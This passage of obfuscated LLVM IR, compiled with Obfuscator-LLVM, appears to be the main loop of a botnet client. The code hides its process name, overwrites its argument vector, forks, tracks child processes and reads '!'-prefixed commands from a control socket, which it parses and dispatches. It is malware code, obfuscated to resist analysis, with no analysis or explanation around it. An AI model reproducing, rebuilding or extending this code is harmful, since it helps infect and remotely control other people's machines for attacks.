  %735 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0)) #2
  store i8* %735, i8** %31, align 8
  %736 = load i32, i32* @x.81
  %737 = load i32, i32* @y.82
  %738 = sub i32 %736, 1
  %739 = mul i32 %736, %738
  %740 = urem i32 %739, 2
  %741 = icmp eq i32 %740, 0
  %742 = icmp slt i32 %737, 10
  %743 = or i1 %741, %742
  br i1 %743, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br label %663

; <label>:744:                                    ; preds = %originalBBpart2129
  %745 = load i32, i32* %30, align 4
  %746 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i32 0, i32 0
  call void @processCmd(i32 %745, i8** %746)
  %747 = load i32, i32* %30, align 4
  %748 = icmp sgt i32 %747, 1
  br i1 %748, label %749, label %779

; <label>:749:                                    ; preds = %744
  store i32 1, i32* %32, align 4
  store i32 1, i32* %32, align 4
  br label %750

; <label>:750:                                    ; preds = %775, %749
  %751 = load i32, i32* %32, align 4
  %752 = load i32, i32* %30, align 4
  %753 = icmp slt i32 %751, %752
  br i1 %753, label %754, label %778

; <label>:754:                                    ; preds = %750
  %755 = load i32, i32* @x.81
  %756 = load i32, i32* @y.82
  %757 = sub i32 %755, 1
  %758 = mul i32 %755, %757
  %759 = urem i32 %758, 2
  %760 = icmp eq i32 %759, 0
  %761 = icmp slt i32 %756, 10
  %762 = or i1 %760, %761
  br i1 %762, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %754
  %763 = load i32, i32* %32, align 4
  %764 = sext i32 %763 to i64
  %765 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %764
  %766 = load i8*, i8** %765, align 8
  call void @free(i8* %766) #2
  %767 = load i32, i32* @x.81
  %768 = load i32, i32* @y.82
  %769 = sub i32 %767, 1
  %770 = mul i32 %767, %769
  %771 = urem i32 %770, 2
  %772 = icmp eq i32 %771, 0
  %773 = icmp slt i32 %768, 10
  %774 = or i1 %772, %773
  br i1 %774, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br label %775

; <label>:775:                                    ; preds = %originalBBpart2172
  %776 = load i32, i32* %32, align 4
  %777 = add nsw i32 %776, 1
  store i32 %777, i32* %32, align 4
  br label %750

; <label>:778:                                    ; preds = %750
  br label %779

; <label>:779:                                    ; preds = %778, %744
  %780 = load i32, i32* @x.81
  %781 = load i32, i32* @y.82
  %782 = sub i32 %780, 1
  %783 = mul i32 %780, %782
  %784 = urem i32 %783, 2
  %785 = icmp eq i32 %784, 0
  %786 = icmp slt i32 %781, 10
  %787 = or i1 %785, %786
  br i1 %787, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %779
  %788 = load i32, i32* @x.81
  %789 = load i32, i32* @y.82
  %790 = sub i32 %788, 1
  %791 = mul i32 %788, %790
  %792 = urem i32 %791, 2
  %793 = icmp eq i32 %792, 0
  %794 = icmp slt i32 %789, 10
  %795 = or i1 %793, %794
  br i1 %795, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br label %796

; <label>:796:                                    ; preds = %originalBBpart2176, %originalBBpart279
  br label %177

; <label>:797:                                    ; preds = %originalBBpart239
  br label %152
                                                  ; No predecessors!
  %799 = load i32, i32* %11, align 4
  ret i32 %799

originalBBalteredBB:                              ; preds = %originalBB, %2
  %800 = alloca i32, align 4
  %801 = alloca i32, align 4
  %802 = alloca i8**, align 8
  %803 = alloca i8*, align 8
  %804 = alloca i32, align 4
  %805 = alloca i32, align 4
  %806 = alloca i32, align 4
  %807 = alloca [4096 x i8], align 16
  %808 = alloca i32, align 4
  %809 = alloca i32, align 4
  %810 = alloca i32*, align 8
  %811 = alloca i32, align 4
  %812 = alloca i8*, align 8
  %813 = alloca i8*, align 8
  %814 = alloca i8*, align 8
  %815 = alloca i8*, align 8
  %816 = alloca [1024 x i8], align 16
  %817 = alloca i32, align 4
  %818 = alloca [10 x i8*], align 16
  %819 = alloca i32, align 4
  %820 = alloca i8*, align 8
  %821 = alloca i32, align 4
  store i32 0, i32* %800, align 4
  store i32 %0, i32* %801, align 4
  store i8** %1, i8*** %802, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i32 0, i32 0), i8** %803, align 8
  %822 = call i8* @getBuild()
  %823 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.62, i32 0, i32 0), i8* %822)
  %824 = load i8**, i8*** %802, align 8
  %825 = getelementptr inbounds i8*, i8** %824, i64 0
  %826 = load i8*, i8** %825, align 8
  %827 = load i8**, i8*** %802, align 8
  %828 = getelementptr inbounds i8*, i8** %827, i64 0
  %829 = load i8*, i8** %828, align 8
  %830 = call i64 @strlen(i8* %829) #10
  %831 = call i8* @strncpy(i8* %826, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i32 0, i32 0), i64 %830) #2
  %832 = load i8**, i8*** %802, align 8
  %833 = getelementptr inbounds i8*, i8** %832, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i32 0, i32 0), i8** %833, align 8
  %834 = load i8*, i8** %803, align 8
  %835 = ptrtoint i8* %834 to i64
  %836 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %835, i32 0, i32 0, i32 0)
  %837 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %838 = call i32 @getpid() #2
  %_ = sub i32 0, %837
  %gen = add i32 %_, %838
  %_1 = shl i32 %837, %838
  %_2 = sub i32 0, %837
  %gen3 = add i32 %_2, %838
  %_4 = shl i32 %837, %838
  %_5 = shl i32 %837, %838
  %839 = xor i32 %837, %838
  call void @srand(i32 %839) #2
  %840 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %841 = call i32 @getpid() #2
  %_6 = sub i32 %840, %841
  %gen7 = mul i32 %_6, %841
  %_8 = sub i32 0, %840
  %gen9 = add i32 %_8, %841
  %_10 = shl i32 %840, %841
  %_11 = shl i32 %840, %841
  %_12 = sub i32 %840, %841
  %gen13 = mul i32 %_12, %841
  %_14 = shl i32 %840, %841
  %_15 = sub i32 0, %840
  %gen16 = add i32 %_15, %841
  %842 = xor i32 %840, %841
  call void @init_rand(i32 %842)
  %843 = call i32 @getOurIP()
  %844 = call i32 @fork() #2
  store i32 %844, i32* %804, align 4
  %845 = icmp ne i32 %844, 0
  br label %originalBB

originalBB17alteredBB:                            ; preds = %originalBB17, %65
  %846 = load i32, i32* %15, align 4
  %847 = call i32 @waitpid(i32 %846, i32* %17, i32 0)
  call void @exit(i32 0) #14
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %90
  call void @exit(i32 0) #14
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %107
  %848 = load i32, i32* %16, align 4
  %849 = icmp ne i32 %848, 0
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %128
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %155
  %850 = call i32 @sleep(i32 5)
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %177
  %851 = load i32, i32* @mainCommSock, align 4
  %852 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %853 = call i32 @recvLine(i32 %851, i8* %852, i32 4096)
  store i32 %853, i32* %19, align 4
  %854 = icmp ne i32 %853, -1
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %204
  %855 = load i32*, i32** @pids, align 8
  %856 = load i32, i32* %20, align 4
  %857 = sext i32 %856 to i64
  %858 = getelementptr inbounds i32, i32* %855, i64 %857
  %859 = load i32, i32* %858, align 4
  %860 = call i32 @waitpid(i32 %859, i32* null, i32 1)
  %861 = icmp sgt i32 %860, 0
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %250
  %862 = load i32*, i32** @pids, align 8
  %863 = load i32, i32* %22, align 4
  %_46 = sub i32 0, %863
  %gen47 = add i32 %_46, 1
  %_48 = sub i32 %863, 1
  %gen49 = mul i32 %_48, 1
  %_50 = shl i32 %863, 1
  %_51 = sub i32 0, %863
  %gen52 = add i32 %_51, 1
  %_53 = shl i32 %863, 1
  %864 = sub i32 %863, 1
  %865 = zext i32 %864 to i64
  %866 = getelementptr inbounds i32, i32* %862, i64 %865
  store i32 0, i32* %866, align 4
  %867 = load i64, i64* @numpids, align 8
  %_54 = shl i64 %867, -1
  %_55 = sub i64 0, %867
  %gen56 = add i64 %_55, -1
  %_57 = sub i64 0, %867
  %gen58 = add i64 %_57, -1
  %_59 = shl i64 %867, -1
  %868 = add i64 %867, -1
  store i64 %868, i64* @numpids, align 8
  %869 = load i64, i64* @numpids, align 8
  %870 = add i64 %869, 1
  %_60 = shl i64 %870, 4
  %_61 = shl i64 %870, 4
  %_62 = shl i64 %870, 4
  %_63 = shl i64 %870, 4
  %_64 = sub i64 0, %870
  %gen65 = add i64 %_64, 4
  %871 = mul i64 %870, 4
  %872 = call noalias i8* @malloc(i64 %871) #2
  %873 = bitcast i8* %872 to i32*
  store i32* %873, i32** %21, align 8
  store i32 0, i32* %22, align 4
  br label %originalBB45

originalBB69alteredBB:                            ; preds = %originalBB69, %297
  %874 = load i32*, i32** @pids, align 8
  %875 = bitcast i32* %874 to i8*
  call void @free(i8* %875) #2
  %876 = load i32*, i32** %21, align 8
  store i32* %876, i32** @pids, align 8
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %330
  %877 = load i32, i32* @mainCommSock, align 4
  %878 = call i32 (i32, i8*, ...) @sockprintf(i32 %877, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0))
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %355
  %879 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  store i8* %879, i8** %23, align 8
  %880 = load i8*, i8** %23, align 8
  %881 = load i8, i8* %880, align 1
  %882 = zext i8 %881 to i32
  %883 = icmp eq i32 %882, 33
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %385
  %884 = load i8*, i8** %24, align 8
  %885 = load i8, i8* %884, align 1
  %886 = zext i8 %885 to i32
  %887 = icmp ne i32 %886, 0
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %406
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %432
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %449
  %888 = load i8*, i8** %24, align 8
  store i8 0, i8* %888, align 1
  %889 = load i8*, i8** %23, align 8
  %890 = getelementptr inbounds i8, i8* %889, i64 1
  store i8* %890, i8** %24, align 8
  %891 = load i8*, i8** %23, align 8
  %892 = load i8*, i8** %24, align 8
  %893 = call i64 @strlen(i8* %892) #10
  %894 = getelementptr inbounds i8, i8* %891, i64 %893
  %895 = getelementptr inbounds i8, i8* %894, i64 2
  store i8* %895, i8** %23, align 8
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %474
  %896 = load i8*, i8** %23, align 8
  %897 = load i8*, i8** %23, align 8
  %898 = call i64 @strlen(i8* %897) #10
  %_98 = shl i64 %898, 1
  %_99 = shl i64 %898, 1
  %_100 = shl i64 %898, 1
  %_101 = shl i64 %898, 1
  %_102 = sub i64 0, %898
  %gen103 = add i64 %_102, 1
  %899 = sub i64 %898, 1
  %900 = getelementptr inbounds i8, i8* %896, i64 %899
  %901 = load i8, i8* %900, align 1
  %902 = zext i8 %901 to i32
  %903 = icmp eq i32 %902, 10
  br label %originalBB97

originalBB107alteredBB:                           ; preds = %originalBB107, %518
  %904 = load i8*, i8** %23, align 8
  %905 = load i8, i8* %904, align 1
  %906 = zext i8 %905 to i32
  %907 = icmp ne i32 %906, 32
  br label %originalBB107

originalBB111alteredBB:                           ; preds = %originalBB111, %539
  %908 = load i8*, i8** %23, align 8
  %909 = load i8, i8* %908, align 1
  %910 = zext i8 %909 to i32
  %911 = icmp ne i32 %910, 0
  br label %originalBB111

originalBB115alteredBB:                           ; preds = %originalBB115, %565
  %912 = load i8*, i8** %23, align 8
  store i8 0, i8* %912, align 1
  %913 = load i8*, i8** %23, align 8
  %914 = getelementptr inbounds i8, i8* %913, i32 1
  store i8* %914, i8** %23, align 8
  %915 = load i8*, i8** %25, align 8
  store i8* %915, i8** %26, align 8
  br label %originalBB115

originalBB119alteredBB:                           ; preds = %originalBB119, %590
  %916 = load i8*, i8** %26, align 8
  %917 = load i8, i8* %916, align 1
  %918 = zext i8 %917 to i32
  %919 = call i32 @toupper(i32 %918) #10
  %920 = trunc i32 %919 to i8
  %921 = load i8*, i8** %26, align 8
  store i8 %920, i8* %921, align 1
  %922 = load i8*, i8** %26, align 8
  %923 = getelementptr inbounds i8, i8* %922, i32 1
  store i8* %923, i8** %26, align 8
  br label %originalBB119

originalBB123alteredBB:                           ; preds = %originalBB123, %622
  br label %originalBB123

originalBB127alteredBB:                           ; preds = %originalBB127, %663
  %924 = load i8*, i8** %31, align 8
  %925 = icmp ne i8* %924, null
  br label %originalBB127

originalBB131alteredBB:                           ; preds = %originalBB131, %687
  %926 = load i8*, i8** %31, align 8
  %927 = call i64 @strlen(i8* %926) #10
  %_132 = sub i64 0, %927
  %gen133 = add i64 %_132, 1
  %_134 = sub i64 0, %927
  %gen135 = add i64 %_134, 1
  %_136 = sub i64 0, %927
  %gen137 = add i64 %_136, 1
  %_138 = sub i64 0, %927
  %gen139 = add i64 %_138, 1
  %_140 = shl i64 %927, 1
  %_141 = sub i64 %927, 1
  %gen142 = mul i64 %_141, 1
  %_143 = sub i64 0, %927
  %gen144 = add i64 %_143, 1
  %_145 = shl i64 %927, 1
  %928 = add i64 %927, 1
  %929 = call noalias i8* @malloc(i64 %928) #2
  %930 = load i32, i32* %30, align 4
  %931 = sext i32 %930 to i64
  %932 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %931
  store i8* %929, i8** %932, align 8
  %933 = load i32, i32* %30, align 4
  %934 = sext i32 %933 to i64
  %935 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %934
  %936 = load i8*, i8** %935, align 8
  %937 = load i8*, i8** %31, align 8
  %938 = call i64 @strlen(i8* %937) #10
  %_146 = sub i64 %938, 1
  %gen147 = mul i64 %_146, 1
  %_148 = sub i64 0, %938
  %gen149 = add i64 %_148, 1
  %_150 = shl i64 %938, 1
  %_151 = shl i64 %938, 1
  %_152 = sub i64 0, %938
  %gen153 = add i64 %_152, 1
  %_154 = sub i64 %938, 1
  %gen155 = mul i64 %_154, 1
  %_156 = shl i64 %938, 1
  %_157 = sub i64 %938, 1
  %gen158 = mul i64 %_157, 1
  %939 = add i64 %938, 1
  call void @llvm.memset.p0i8.i64(i8* %936, i8 0, i64 %939, i32 1, i1 false)
  %940 = load i32, i32* %30, align 4
  %941 = sext i32 %940 to i64
  %942 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %941
  %943 = load i8*, i8** %942, align 8
  %944 = load i8*, i8** %31, align 8
  %945 = call i8* @strcpy(i8* %943, i8* %944) #2
  %946 = load i32, i32* %30, align 4
  %_159 = shl i32 %946, 1
  %_160 = shl i32 %946, 1
  %_161 = sub i32 0, %946
  %gen162 = add i32 %_161, 1
  %947 = add nsw i32 %946, 1
  store i32 %947, i32* %30, align 4
  br label %originalBB131

originalBB166alteredBB:                           ; preds = %originalBB166, %726
  %948 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0)) #2
  store i8* %948, i8** %31, align 8
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %754
  %949 = load i32, i32* %32, align 4
  %950 = sext i32 %949 to i64
  %951 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %950
  %952 = load i8*, i8** %951, align 8
  call void @free(i8* %952) #2
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %779
  br label %originalBB174
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

declare i32 @sleep(i32) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146615408}
!2 = !{i32 -2146614717}
!3 = !{i32 -2146613968}
!4 = !{i32 -2146613145}
!5 = !{i32 -2146612325}
!6 = !{i32 -2146611007}
!7 = !{i32 -2146610145}
!8 = !{i32 -2146609424}
